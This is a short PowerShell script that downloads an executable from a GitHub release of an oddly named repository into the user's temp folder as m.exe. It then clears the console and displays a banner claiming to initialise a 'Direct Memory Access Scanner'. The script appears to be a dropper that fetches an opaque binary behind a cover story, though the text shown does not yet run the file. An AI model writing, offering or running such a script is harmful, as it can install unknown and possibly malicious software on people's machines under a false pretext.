try {
    iwr https://github.com/Proxyonly/dsfds/releases/download/da/TEMP.exe -O $env:TEMP\m.exe
    Write-Host "[✓] Download complete." -ForegroundColor Green
} catch {
    Write-Host "[!] Download failed: $_" -ForegroundColor Red
    exit 1
}

Clear-Host
Write-Host "[*] Initializing Direct Memory Access Scanner..." -ForegroundColor Yellow
Start-Sleep -Seconds 1
